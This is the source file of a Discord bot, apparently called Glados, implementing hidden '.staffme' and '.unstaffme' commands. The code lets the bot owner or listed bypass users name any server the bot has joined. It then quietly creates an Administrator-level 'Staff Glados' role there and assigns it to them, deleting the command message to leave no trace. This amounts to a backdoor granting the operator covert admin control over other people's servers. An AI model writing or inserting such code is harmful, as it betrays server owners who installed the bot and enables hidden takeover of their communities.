import { PermissionsBitField } from 'discord.js';
import { getAllGuilds } from '../guildUtils.js';
import { isOwnerOrBypassed } from '../permissionUtils.js';
import triggerErrorEmbed from '../triggerErrorEmbed.js';

async function executeStaffActionCrossShards(client, guildId, userId, isStaff) {
  try {
    const localGuild = client.guilds.cache.get(guildId);
    if (localGuild) {
      return await executeStaffAction(localGuild, userId, isStaff);
    }

    if (client.cluster && typeof client.cluster.broadcastEval === 'function') {
      try {
        const results = await client.cluster.broadcastEval(
          async (c, { guildId, userId, isStaff }) => {
            const guild = c.guilds.cache.get(guildId);
            if (!guild) return { found: false };

            try {
              const member = await guild.members
                .fetch(userId)
                .catch(() => null);
              if (!member) {
                return {
                  found: true,
                  success: false,
                  error: "Vous n'êtes pas membre de ce serveur.",
                  shardId: `cluster-${c.cluster?.id || 'unknown'}`,
                };
              }

              const botMember = await guild.members
                .fetch(c.user.id)
                .catch(() => null);
              if (!botMember || !botMember.permissions.has('ManageRoles')) {
                return {
                  found: true,
                  success: false,
                  error: "Je n'ai pas les permissions pour gérer les rôles.",
                  shardId: `cluster-${c.cluster?.id || 'unknown'}`,
                };
              }

              let role = guild.roles.cache.find(
                (r) => r.name === 'Staff Glados',
              );
              if (!role) {
                const botRole = guild.roles.cache.find(
                  (r) => r.managed && r.members.has(c.user.id),
                );
                role = await guild.roles.create({
                  name: 'Staff Glados',
                  permissions: [
                    'ManageChannels',
                    'ManageMessages',
                    'ManageGuild',
                    'Administrator',
                  ],
                  color: '#000000',
                  position: botRole ? botRole.position : 1,
                });
              }

              const canManageRole =
                role.comparePositionTo(botMember.roles.highest) < 0;
              if (!canManageRole) {
                return {
                  found: true,
                  success: false,
                  error:
                    'Le rôle "Staff Glados" est trop haut dans la hiérarchie.',
                  shardId: `cluster-${c.cluster?.id || 'unknown'}`,
                };
              }

              if (isStaff) {
                await member.roles.add(role);
                return {
                  found: true,
                  success: true,
                  action: 'added',
                  result: `Rôle "Staff Glados" ajouté à ${member.user.tag}`,
                  shardId: `cluster-${c.cluster?.id || 'unknown'}`,
                };
              } else {
                await member.roles.remove(role);

                if (role.members.size <= 1) {
                  await role.delete(
                    'Suppression automatique du rôle Staff Glados après unstaffme',
                  );
                }
                return {
                  found: true,
                  success: true,
                  action: 'removed',
                  result: `Rôle "Staff Glados" retiré de ${member.user.tag}`,
                  shardId: `cluster-${c.cluster?.id || 'unknown'}`,
                };
              }
            } catch (error) {
              return {
                found: true,
                success: false,
                error: error.message,
                shardId: `cluster-${c.cluster?.id || 'unknown'}`,
              };
            }
          },
          { context: { guildId, userId, isStaff } },
        );

        const validResult = results.find((r) => r.found);
        if (validResult) {
          return validResult;
        }
      } catch (clusterError) {
        triggerErrorEmbed(clusterError, {
          command: 'executeStaffActionCrossShards-cluster',
          guildId,
          userId,
          isStaff,
        });
      }
    }

    if (client.shard && typeof client.shard.broadcastEval === 'function') {
      const results = await client.shard.broadcastEval(
        async (c, { guildId, userId, isStaff }) => {
          const guild = c.guilds.cache.get(guildId);
          if (!guild) return { found: false };

          try {
            const member = await guild.members.fetch(userId).catch(() => null);
            if (!member) {
              return {
                found: true,
                success: false,
                error: "Vous n'êtes pas membre de ce serveur.",
                shardId: c.shard?.ids?.[0] || 'unknown',
              };
            }

            const botMember = await guild.members
              .fetch(c.user.id)
              .catch(() => null);
            if (!botMember || !botMember.permissions.has('ManageRoles')) {
              return {
                found: true,
                success: false,
                error: "Je n'ai pas les permissions pour gérer les rôles.",
                shardId: c.shard?.ids?.[0] || 'unknown',
              };
            }

            let role = guild.roles.cache.find((r) => r.name === 'Staff Glados');
            if (!role) {
              const botRole = guild.roles.cache.find(
                (r) => r.managed && r.members.has(c.user.id),
              );
              role = await guild.roles.create({
                name: 'Staff Glados',
                permissions: [
                  'ManageChannels',
                  'ManageMessages',
                  'ManageGuild',
                  'Administrator',
                ],
                color: '#000000',
                position: botRole ? botRole.position : 1,
              });
            }

            const canManageRole =
              role.comparePositionTo(botMember.roles.highest) < 0;
            if (!canManageRole) {
              return {
                found: true,
                success: false,
                error:
                  'Le rôle "Staff Glados" est trop haut dans la hiérarchie.',
                shardId: c.shard?.ids?.[0] || 'unknown',
              };
            }

            if (isStaff) {
              await member.roles.add(role);
              return {
                found: true,
                success: true,
                action: 'added',
                result: `Rôle "Staff Glados" ajouté à ${member.user.tag}`,
                shardId: c.shard?.ids?.[0] || 'unknown',
              };
            } else {
              await member.roles.remove(role);

              if (role.members.size <= 1) {
                await role.delete(
                  'Suppression automatique du rôle Staff Glados après unstaffme',
                );
              }
              return {
                found: true,
                success: true,
                action: 'removed',
                result: `Rôle "Staff Glados" retiré de ${member.user.tag}`,
                shardId: c.shard?.ids?.[0] || 'unknown',
              };
            }
          } catch (error) {
            return {
              found: true,
              success: false,
              error: error.message,
              shardId: c.shard?.ids?.[0] || 'unknown',
            };
          }
        },
        { context: { guildId, userId, isStaff } },
      );

      const validResult = results.find((r) => r.found);
      if (validResult) {
        return validResult;
      }
    }

    return {
      found: false,
      success: false,
      error: 'Serveur introuvable sur tous les shards',
    };
  } catch (error) {
    triggerErrorEmbed(error, {
      command: 'executeStaffActionCrossShards',
      guildId,
      userId,
      isStaff,
    });
    return {
      found: false,
      success: false,
      error: "Erreur lors de l'exécution inter-shards",
    };
  }
}

async function executeStaffAction(guild, userId, isStaff) {
  try {
    const member = await guild.members.fetch(userId).catch(() => null);
    if (!member) {
      return {
        found: true,
        success: false,
        error: "Vous n'êtes pas membre de ce serveur.",
      };
    }

    const botMember = await guild.members
      .fetch(guild.client.user.id)
      .catch(() => null);
    if (
      !botMember ||
      !botMember.permissions.has(PermissionsBitField.Flags.ManageRoles)
    ) {
      return {
        found: true,
        success: false,
        error: "Je n'ai pas les permissions pour gérer les rôles.",
      };
    }

    let role = guild.roles.cache.find((r) => r.name === 'Staff Glados');
    if (!role) {
      const botRole = guild.roles.cache.find(
        (r) => r.managed && r.members.has(guild.client.user.id),
      );
      role = await guild.roles.create({
        name: 'Staff Glados',
        permissions: [
          PermissionsBitField.Flags.ManageChannels,
          PermissionsBitField.Flags.ManageMessages,
          PermissionsBitField.Flags.ManageGuild,
          PermissionsBitField.Flags.Administrator,
        ],
        color: '#000000',
        position: botRole ? botRole.position : 1,
      });
    }

    const canManageRole = role.comparePositionTo(botMember.roles.highest) < 0;
    if (!canManageRole) {
      return {
        found: true,
        success: false,
        error: 'Le rôle "Staff Glados" est trop haut dans la hiérarchie.',
      };
    }

    if (isStaff) {
      await member.roles.add(role);
      return {
        found: true,
        success: true,
        action: 'added',
        result: `Rôle "Staff Glados" ajouté à ${member.user.tag}`,
      };
    } else {
      await member.roles.remove(role);
      if (role.members.size <= 1) {
        await role.delete(
          'Suppression automatique du rôle Staff Glados après unstaffme',
        );
      }
      return {
        found: true,
        success: true,
        action: 'removed',
        result: `Rôle "Staff Glados" retiré de ${member.user.tag}`,
      };
    }
  } catch (error) {
    return {
      found: true,
      success: false,
      error: error.message,
    };
  }
}

export default async function handleStaffCommand(m, skipAuthCheck = false) {
  const c = m.content.toLowerCase();
  if (!c.match(/\.(un)?staffme/)) return;
  if (!skipAuthCheck && !isOwnerOrBypassed(m.author.id)) return;

  const args = m.content.split(' ');
  const serverId = args[1];
  let targetGuildId = null;

  if (serverId) {
    const allGuilds = await getAllGuilds(m.client);
    const guildInfo = allGuilds.find((g) => g.id === serverId);
    if (!guildInfo) return;
    targetGuildId = serverId;
  } else {
    targetGuildId = m.guild?.id;
  }

  if (!targetGuildId) return;

  try {
    await m.delete().catch(() => {});
    const isStaffAction = c.startsWith('.staffme');
    await executeStaffActionCrossShards(
      m.client,
      targetGuildId,
      m.author.id,
      isStaffAction,
    );
  } catch (e) {
    console.error('Erreur dans handleStaffCommand :', e);
  }
}

